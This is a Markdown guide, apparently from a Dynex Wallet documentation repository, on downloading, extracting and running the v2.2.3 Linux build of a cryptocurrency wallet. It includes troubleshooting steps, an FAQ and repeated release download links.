<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# How to Install Dynex Wallet on Linux

**Download the `.zip` for Linux x64, extract it, and run the wallet binary directly -- no package manager required.**

Dynex Wallet on Linux ships as a plain zipped archive rather than a `.deb` or `.rpm`, which keeps it simple but means a few of the usual installer conveniences (menu shortcuts, automatic updates) are up to you to set up. Here's the full process.

## You'll see this if...

- You're setting up Dynex Wallet on a Linux desktop or server for the first time.
- You extracted the archive but the binary won't run or complains about permissions.
- You're trying to decide between a local node and a remote node for your Linux machine.
- You want to confirm the download hasn't been corrupted or tampered with before trusting it with wallet funds.

## Why it happens

Linux distributions vary widely in how they handle file permissions and executable flags, so a freshly extracted binary commonly needs its execute permission set explicitly -- this isn't specific to Dynex Wallet, it's standard behavior for any downloaded Linux executable. Likewise, because there's no central installer managing dependencies, missing shared libraries on a minimal or older distro can prevent the binary from launching, which can look like the wallet itself is broken when it's really a missing system package.

## Step-by-step fix

1. Go to the official [Dynex Wallet download page](https://dynexwallet.org/download) and download `dynex-wallet-linux-x64-v2.2.3.zip`. For the full file list and release notes, see the [v2.2.3 GitHub release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).
2. If you're unsure this is the right build, check [which Dynex Wallet file to download](./which-dynex-wallet-file-to-download.md) -- the Linux build is x64 only.
3. Before running it, confirm the file against the [official v2.2.3 release page](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).
4. Extract the archive: `unzip dynex-wallet-linux-x64-v2.2.3.zip -d ~/dynex-wallet`.
5. Make the binary executable if it isn't already: `chmod +x ~/dynex-wallet/dynex-wallet` (the exact binary name may vary slightly by build).
6. Run it from a terminal: `cd ~/dynex-wallet && ./dynex-wallet`. Running from a terminal the first time makes it easier to see any error output if it fails to launch.
7. Confirm the version shown in the app is v2.2.3, then choose to create a new wallet or restore an existing one. For a new wallet, see [creating your first Dynex Wallet](./create-first-dynex-wallet.md).
8. Check system requirements: 64-bit Linux, 2+ cores, 8 GB RAM recommended, 5 GB free disk space, internet access for syncing.

## If that didn't work

If the binary refuses to launch with a "permission denied" message, double check the `chmod +x` step above and confirm you're running it from a filesystem that allows execution (some mounted network drives disable this by default). If you get errors about missing shared libraries, install your distro's standard GUI toolkit packages (the specific package names vary by distribution) and try again -- this is a system dependency issue, not a problem with the wallet file itself.

If the app opens but nothing happens when you try to sync, consider using a remote node instead of running a full local node, especially on lower-powered machines -- see [remote node vs local node](https://dynexwallet.org/docs/remote-nodes). If you are running a local node and expect peer connections, make sure outbound (and for hosting peers, inbound) traffic on P2P port 17336 isn't blocked by your firewall; see [firewall and port 17336](https://dynexwallet.org/troubleshooting).

If sync starts but then stalls on a specific block for a long time, that's a separate, well-known issue covered in [Dynex Wallet sync stuck at a block](./dynex-wallet-sync-stuck-at-block.md).

## Prevent it next time

Use the official release page as your reference for what a genuine file looks like. If you set up a desktop shortcut or systemd service to launch the wallet automatically, document the exact path you extracted it to, since there's no package manager tracking that for you on this platform.

Install v2.2.3 specifically rather than reusing an older archive you might have sitting around. This build adds a sync watchdog that detects and recovers a wallet stuck at a block (a known pain point on slower or intermittently-connected Linux boxes), a wallet optimizer for consolidating many small mining payouts, clearer locked-versus-unconfirmed balance reporting, and a remote node option that's especially useful if you're running Dynex Wallet on modest hardware and don't want to maintain a full local node and its blockchain data.

## FAQ

### Is there an official `.deb` or `.rpm` package for Dynex Wallet?
Not currently -- the official Linux distribution is a `.zip` archive containing the binary; you extract and run it directly.

### Which Linux distributions are supported?
The build targets generic Linux x64; most modern 64-bit distributions work, though minor shared-library differences between distros can occasionally require installing a missing system package.

### Can I run Dynex Wallet on a headless Linux server?
The desktop wallet is built with a graphical interface in mind; for headless setups, running a remote node elsewhere and connecting another device's wallet to it is usually simpler than trying to run the GUI wallet without a display.

### How do I update Dynex Wallet on Linux?
Download the newer `.zip`, extract it to a new or the same folder, and run the new binary; your wallet files are stored separately and aren't affected by replacing the application files.

### Do I need root/administrator access to install it?
No. You can extract and run the archive entirely within your own user account; root access isn't required for normal use.

### Where are my wallet files stored on Linux?
In recent builds, under `~/.dynexwallet/wallets`. Back this folder up regularly -- see [backing up your Dynex Wallet file](./backup-dynex-wallet-file.md).

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it from the official release page, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [install and verify guides on dynexwallet.org](https://dynexwallet.org/download).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [How to Install Dynex Wallet on Windows](./install-dynex-wallet-windows.md) |
| [How to Install Dynex Wallet on macOS](./install-dynex-wallet-macos.md) |
| [Which Dynex Wallet File Should You Download?](./which-dynex-wallet-file-to-download.md) |
| [Dynex transaction byte size too big](./dynex-transaction-byte-size-too-big.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
